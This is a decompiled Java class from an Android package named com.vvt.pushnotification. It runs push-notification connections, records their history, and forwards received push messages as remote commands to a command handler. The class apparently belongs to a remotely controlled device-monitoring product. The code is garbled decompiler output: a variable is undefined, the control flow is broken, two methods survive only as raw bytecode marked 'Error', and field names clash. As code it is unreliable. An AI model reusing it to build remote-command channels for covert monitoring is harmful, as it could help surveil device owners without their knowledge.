package com.vvt.pushnotification;

import android.content.Context;
import android.util.Log;
import com.vvt.base.RunningMode;
import com.vvt.pushnotification.connectionhistory.ConnectionType;
import com.vvt.pushnotification.connectionhistory.PushConnectionHistoryEntry;
import com.vvt.pushnotification.connectionhistory.PushProtocal;
import com.vvt.pushnotification.connectionhistory.Status;
import com.vvt.remotecommand.RemoteCommand;
import com.vvt.remotecommand.RemoteCommand.Type;

public class d
  implements com.vvt.pushnotification.a.a.d, com.vvt.pushnotification.b.a, c, g
{
  private static final boolean a = a.a;
  private static final boolean b = a.e;
  private MqttPushNotificationService c;
  private h d;
  private f e;
  private com.vvt.pushnotification.b.b f;
  private com.vvt.pushnotification.a.a.f g;
  private com.vvt.pushnotification.connectionhistory.a h;
  private com.vvt.base.a i;
  private com.vvt.remotecommand.b j;
  private final RunningMode k;
  private final boolean l;
  private final Context m;
  private String n;
  private String o;
  
  public d(com.vvt.base.a parama, com.vvt.remotecommand.b paramb, RunningMode paramRunningMode, com.vvt.phoneinfo.a parama1, String paramString, Context paramContext)
  {
    Object localObject = parama1.d();
    int i2 = ((String)localObject).length();
    if (i2 > i1) {
      localObject = ((String)localObject).substring(0, i1);
    }
    this.o = paramString;
    this.n = ((String)localObject);
    this.i = parama;
    this.j = paramb;
    localObject = RunningMode.FULL;
    boolean bool;
    if (paramRunningMode == localObject) {
      bool = true;
    }
    for (;;)
    {
      this.l = bool;
      this.k = paramRunningMode;
      this.m = paramContext;
      return;
      bool = false;
      localObject = null;
    }
  }
  
  private void a(PushProtocal paramPushProtocal, String paramString, Status paramStatus, int paramInt)
  {
    PushConnectionHistoryEntry localPushConnectionHistoryEntry = new com/vvt/pushnotification/connectionhistory/PushConnectionHistoryEntry;
    localPushConnectionHistoryEntry.<init>();
    ConnectionType localConnectionType = e.a(this.m);
    localPushConnectionHistoryEntry.setConnectionType(localConnectionType);
    long l1 = System.currentTimeMillis();
    localPushConnectionHistoryEntry.setDate(l1);
    localPushConnectionHistoryEntry.setMessage(paramString);
    localPushConnectionHistoryEntry.setPushProtocal(paramPushProtocal);
    localPushConnectionHistoryEntry.setStatus(paramStatus);
    localPushConnectionHistoryEntry.setStatusCode(paramInt);
    this.h.a(localPushConnectionHistoryEntry);
  }
  
  private void i()
  {
    boolean bool = this.l;
    if (bool)
    {
      com.vvt.pushnotification.b.b localb = new com/vvt/pushnotification/b/b;
      localb.<init>(this);
      this.f = localb;
      localb = this.f;
      int i1 = 10;
      localb.a(i1);
      localb = this.f;
      localb.a();
    }
    for (;;)
    {
      return;
      bool = a;
      if (!bool) {}
    }
  }
  
  private boolean j()
  {
    for (boolean bool1 = false;; bool1 = true)
    {
      try
      {
        localf = l();
        if (localf != null) {
          break label21;
        }
        boolean bool2 = a;
        if (!bool2) {}
      }
      finally
      {
        for (;;)
        {
          f localf;
          label21:
          boolean bool3 = b;
          if (bool3)
          {
            String str1 = "PushNotificationManager";
            String str2 = "internalStart #  err ..";
            Log.e(str1, str2, localThrowable);
          }
        }
      }
      return bool1;
      bool3 = a;
      if (bool3) {}
      this.e = localf;
      localf = this.e;
      localf.a();
    }
  }
  
  private void k()
  {
    boolean bool = a;
    if (bool) {}
    f localf = this.e;
    if (localf != null)
    {
      this.e.b();
      bool = false;
      localf = null;
      this.e = null;
    }
  }
  
  private f l()
  {
    Object localObject = this.c;
    boolean bool = ((MqttPushNotificationService)localObject).c();
    if (bool) {
      localObject = this.c;
    }
    for (;;)
    {
      return (f)localObject;
      localObject = this.d;
      bool = ((h)localObject).c();
      if (bool)
      {
        localObject = this.d;
      }
      else
      {
        bool = false;
        localObject = null;
      }
    }
  }
  
  public void a()
  {
    Object localObject1 = new com/vvt/pushnotification/connectionhistory/b;
    Object localObject2 = this.o;
    ((com.vvt.pushnotification.connectionhistory.b)localObject1).<init>((String)localObject2);
    this.h = ((com.vvt.pushnotification.connectionhistory.a)localObject1);
    localObject1 = this.k;
    localObject2 = RunningMode.FULL;
    boolean bool1;
    if (localObject1 != localObject2)
    {
      localObject1 = this.k;
      localObject2 = RunningMode.LIMITED_1;
      if (localObject1 != localObject2) {}
    }
    else
    {
      bool1 = true;
    }
    for (;;)
    {
      localObject2 = new com/vvt/pushnotification/MqttPushNotificationService;
      Object localObject3 = this.n;
      ((MqttPushNotificationService)localObject2).<init>((String)localObject3, bool1);
      this.c = ((MqttPushNotificationService)localObject2);
      this.c.a(this);
      this.c.a(this);
      localObject1 = new com/vvt/pushnotification/h;
      localObject2 = this.n;
      ((h)localObject1).<init>((String)localObject2);
      this.d = ((h)localObject1);
      this.d.a(this);
      this.d.a(this);
      localObject1 = new com/vvt/pushnotification/a/a/f;
      boolean bool2 = this.l;
      localObject3 = this.m;
      ((com.vvt.pushnotification.a.a.f)localObject1).<init>(bool2, (Context)localObject3);
      this.g = ((com.vvt.pushnotification.a.a.f)localObject1);
      this.g.a(this);
      return;
      bool1 = false;
      localObject1 = null;
    }
  }
  
  public void a(PushProtocal paramPushProtocal)
  {
    Object localObject = new Object[1];
    localObject[0] = paramPushProtocal;
    String str = String.format("Connected to Push notification server [%s].", (Object[])localObject);
    boolean bool = a;
    if (bool) {}
    localObject = Status.CONNECTED;
    a(paramPushProtocal, str, (Status)localObject, 0);
  }
  
  /* Error */
  public void a(PushProtocal paramPushProtocal, Throwable paramThrowable)
  {
    // Byte code:
    //   0: aload_0
    //   1: monitorenter
    //   2: getstatic 48	com/vvt/pushnotification/d:removeFromPath	Z
    //   5: istore_3
    //   6: iload_3
    //   7: ifeq +20 -> 27
    //   10: ldc -101
    //   12: astore 4
    //   14: ldc -34
    //   16: astore 5
    //   18: aload 4
    //   20: aload 5
    //   22: aload_2
    //   23: invokestatic 162	android/util/Log:e	(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I
    //   26: pop
    //   27: aload_0
    //   28: getfield 150	com/vvt/pushnotification/d:e	Lcom/vvt/pushnotification/f;
    //   31: astore 4
    //   33: aload 4
    //   35: ifnull +26 -> 61
    //   38: aload_0
    //   39: getfield 150	com/vvt/pushnotification/d:e	Lcom/vvt/pushnotification/f;
    //   42: astore 4
    //   44: aload 4
    //   46: invokeinterface 164 1 0
    //   51: iconst_0
    //   52: istore_3
    //   53: aconst_null
    //   54: astore 4
    //   56: aload_0
    //   57: aconst_null
    //   58: putfield 150	com/vvt/pushnotification/d:e	Lcom/vvt/pushnotification/f;
    //   61: ldc -32
    //   63: astore 4
    //   65: iconst_2
    //   66: istore 6
    //   68: iload 6
    //   70: anewarray 4	java/lang/Object
    //   73: astore 5
    //   75: iconst_0
    //   76: istore 7
    //   78: aload 5
    //   80: iconst_0
    //   81: aload_1
    //   82: aastore
    //   83: iconst_1
    //   84: istore 7
    //   86: aload_2
    //   87: invokestatic 228	com/vvt/pushnotification/e:a	(Ljava/lang/Throwable;)Ljava/lang/String;
    //   90: astore 8
    //   92: aload 5
    //   94: iload 7
    //   96: aload 8
    //   98: aastore
    //   99: aload 4
    //   101: aload 5
    //   103: invokestatic 211	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   106: astore 4
    //   108: getstatic 231	com/vvt/pushnotification/connectionhistory/Status:DISCONNECTED	Lcom/vvt/pushnotification/connectionhistory/Status;
    //   111: astore 5
    //   113: sipush 1000
    //   116: istore 7
    //   118: aload_0
    //   119: aload_1
    //   120: aload 4
    //   122: aload 5
    //   124: iload 7
    //   126: invokespecial 220	com/vvt/pushnotification/d:a	(Lcom/vvt/pushnotification/connectionhistory/PushProtocal;Ljava/lang/String;Lcom/vvt/pushnotification/connectionhistory/Status;I)V
    //   129: aload_0
    //   130: getfield 202	com/vvt/pushnotification/d:FxFileObserverWorker	Lcom/vvt/pushnotification/a/a/f;
    //   133: astore 4
    //   135: aload 4
    //   137: invokevirtual 233	com/vvt/pushnotification/a/a/f:MyUncaughtExceptionHandler	()Z
    //   140: istore_3
    //   141: iload_3
    //   142: ifeq +25 -> 167
    //   145: getstatic 44	com/vvt/pushnotification/d:a	Z
    //   148: istore_3
    //   149: iload_3
    //   150: ifeq +3 -> 153
    //   153: aload_0
    //   154: getfield 202	com/vvt/pushnotification/d:FxFileObserverWorker	Lcom/vvt/pushnotification/a/a/f;
    //   157: astore 4
    //   159: aload 4
    //   161: invokevirtual 235	com/vvt/pushnotification/a/a/f:d	()V
    //   164: aload_0
    //   165: monitorexit
    //   166: return
    //   167: getstatic 44	com/vvt/pushnotification/d:a	Z
    //   170: istore_3
    //   171: iload_3
    //   172: ifeq -8 -> 164
    //   175: goto -11 -> 164
    //   178: astore 4
    //   180: aload_0
    //   181: monitorexit
    //   182: aload 4
    //   184: athrow
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	185	0	this	d
    //   0	185	1	paramPushProtocal	PushProtocal
    //   0	185	2	paramThrowable	Throwable
    //   5	167	3	bool	boolean
    //   12	148	4	localObject1	Object
    //   178	5	4	localObject2	Object
    //   16	107	5	localObject3	Object
    //   66	3	6	i1	int
    //   76	49	7	i2	int
    //   90	7	8	str	String
    // Exception table:
    //   from	to	target	type
    //   2	5	178	finally
    //   22	27	178	finally
    //   27	31	178	finally
    //   38	42	178	finally
    //   44	51	178	finally
    //   57	61	178	finally
    //   68	73	178	finally
    //   81	83	178	finally
    //   86	90	178	finally
    //   96	99	178	finally
    //   101	106	178	finally
    //   108	111	178	finally
    //   124	129	178	finally
    //   129	133	178	finally
    //   135	140	178	finally
    //   145	148	178	finally
    //   153	157	178	finally
    //   159	164	178	finally
    //   167	170	178	finally
  }
  
  public void a(String paramString)
  {
    boolean bool = a;
    if (bool) {}
    RemoteCommand localRemoteCommand = new com/vvt/remotecommand/RemoteCommand;
    localRemoteCommand.<init>();
    Object localObject = RemoteCommand.Type.PUSH;
    localRemoteCommand.setType((RemoteCommand.Type)localObject);
    localRemoteCommand.setData(paramString);
    localObject = this.j;
    if (localObject != null)
    {
      localObject = this.j;
      ((com.vvt.remotecommand.b)localObject).a(localRemoteCommand);
    }
    bool = a;
    if (bool) {}
  }
  
  public void b()
  {
    boolean bool = a;
    if (bool) {}
    j();
    bool = a;
    if (bool) {}
    i();
    bool = a;
    if (bool) {}
    this.g.a();
  }
  
  public void b(PushProtocal paramPushProtocal, Throwable paramThrowable)
  {
    String str = "";
    Status localStatus = Status.DISCONNECTED;
    int i1 = 1001;
    if (paramThrowable != null) {
      str = e.a(paramThrowable);
    }
    a(paramPushProtocal, str, localStatus, i1);
  }
  
  public void c()
  {
    boolean bool = a;
    if (bool) {}
    bool = a;
    if (bool) {}
    Object localObject = this.g;
    ((com.vvt.pushnotification.a.a.f)localObject).b();
    bool = this.l;
    if (bool)
    {
      localObject = this.f;
      if (localObject != null)
      {
        bool = a;
        if (bool) {}
        this.f.b();
        bool = false;
        localObject = null;
        this.f = null;
      }
    }
    k();
  }
  
  public void d()
  {
    boolean bool = a;
    if (bool) {}
    f localf = this.e;
    if (localf == null)
    {
      bool = a;
      if (bool) {}
      j();
    }
    for (;;)
    {
      return;
      localf = this.e;
      localf.d();
    }
  }
  
  /* Error */
  public void e()
  {
    // Byte code:
    //   0: aload_0
    //   1: monitorenter
    //   2: getstatic 44	com/vvt/pushnotification/d:a	Z
    //   5: istore_1
    //   6: iload_1
    //   7: ifeq +3 -> 10
    //   10: aload_0
    //   11: getfield 150	com/vvt/pushnotification/d:e	Lcom/vvt/pushnotification/f;
    //   14: astore_2
    //   15: aload_2
    //   16: ifnonnull +19 -> 35
    //   19: getstatic 44	com/vvt/pushnotification/d:a	Z
    //   22: istore_1
    //   23: iload_1
    //   24: ifeq +3 -> 27
    //   27: aload_0
    //   28: invokespecial 258	com/vvt/pushnotification/d:j	()Z
    //   31: pop
    //   32: aload_0
    //   33: monitorexit
    //   34: return
    //   35: getstatic 44	com/vvt/pushnotification/d:a	Z
    //   38: istore_1
    //   39: iload_1
    //   40: ifeq +3 -> 43
    //   43: aload_0
    //   44: getfield 150	com/vvt/pushnotification/d:e	Lcom/vvt/pushnotification/f;
    //   47: astore_2
    //   48: aload_2
    //   49: invokeinterface 272 1 0
    //   54: goto -22 -> 32
    //   57: astore_2
    //   58: aload_0
    //   59: monitorexit
    //   60: aload_2
    //   61: athrow
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	62	0	this	d
    //   5	35	1	bool	boolean
    //   14	35	2	localf	f
    //   57	4	2	localObject	Object
    // Exception table:
    //   from	to	target	type
    //   2	5	57	finally
    //   10	14	57	finally
    //   19	22	57	finally
    //   27	32	57	finally
    //   35	38	57	finally
    //   43	47	57	finally
    //   48	54	57	finally
  }
  
  public void f()
  {
    boolean bool = a;
    if (bool) {}
  }
  
  public boolean g()
  {
    boolean bool1 = a;
    if (bool1) {}
    f localf = this.e;
    if (localf == null)
    {
      bool1 = false;
      localf = null;
    }
    for (;;)
    {
      boolean bool2 = a;
      if (bool2) {}
      bool2 = a;
      if (bool2) {}
      return bool1;
      localf = this.e;
      bool1 = localf.f();
    }
  }
  
  public PushConnectionHistoryEntry h()
  {
    try
    {
      Object localObject1 = this.h;
      localObject1 = ((com.vvt.pushnotification.connectionhistory.a)localObject1).a();
      return (PushConnectionHistoryEntry)localObject1;
    }
    finally {}
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/pushnotification/d.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */